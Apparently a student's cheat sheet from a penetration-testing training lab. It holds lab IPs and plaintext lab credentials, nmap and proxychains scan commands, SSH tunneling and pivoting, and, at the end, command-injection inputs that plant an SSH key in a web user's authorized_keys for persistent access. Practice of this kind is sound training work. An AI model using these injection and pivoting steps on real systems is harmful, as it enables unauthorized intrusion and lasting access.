http://10.50.20.250:8000/          TYFI-006-M  Ja7Gh0bmQhGeAWq
10.50.28.181  Semper
GREYHOST:     10.50.35.7                                                                           student     Ja7Gh0bmQhGeAWq
ACCESSING GREYHOST:
  ssh -X student@10.50.35.7                                                                        Ja7Gh0bmQhGeAWq
  ssh -MS /tmp/grey student@10.50.35.7                                                             Ja7Gh0bmQhGeAWq

#CREDENTIALS
  WINDOWS:    xfreerdp /u:student /v:10.50.42.187 -dynamic-resolution +glyph-cache +clipboard      Charity@2006
  LINUX:      ssh -X student@10.50.29.84                                                           Charity@2006
  GREYHOST:                                                                                   Student     Long Pass
  
REBUILD BOXES:
  VTA
  INSTANCES
  REBUILD INSTANCE
  SELECT IMAGE: NIX_OPS
  PARTITIION: AUTOMATIC
  REBUILD INSTANCE
  

#NMAP SCRIPT COMMANDS
  /usr/share/nmap/scripts
  nmap --script <filename>|<category>|<directory>
  nmap --script-help "ftp-* and discovery"
  nmap --script-args <args>
  nmap --script-args-file <filename>
  nmap --script-help <filename>|<category>|<directory>
  nmap --script-trace
      http-enum.nse


#COMMANDS
  ssh -MS /tmp/grey student@10.50.35.7
  ssh -S /tmp/grey grey -O forward -D 9050
  for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
  proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.1,2,3,97,98,99,100,105,111,120,129,130,131 -p-
  ssh -S /tmp/grey grey -O forward -L 40700:192.168.28.111:80
  ssh -S /tmp/grey grey -O forward -L 40710:192.168.28.111:22                                                  #Sets a new master socket referencing the original master socket to access an additional box
  ssh -MS /tmp/billybobhost billybob@0.0.0.0 -p 40710
  ssh -S /tmp/billybobhost -O forward -D 9050
  ssh -S /tmp/grey grey -O cancel -L 40700:192.168.28.111:80                                                   #Closes out a tunnel
  proxychains nmap -v -sT -Pn -T4 --script http-enum.nse 192.168.28.111 -p 80
  



ssh-keygen -t rsa -b 4096                                                                                        #Generates public ssh key
; mkdir /var/www/.ssh
; ls /var/www/ssh
vim test.txt
cat id_rsa.pub            ##HIGHLIGHT ALL OF IT##
copy to test.txt and addd > /var/www/.ssh/authorized_keys to the end
; echo (cat test.txt and copy over file contents) in quotes
ssh -i id_rsa www-data@10.50.27.157
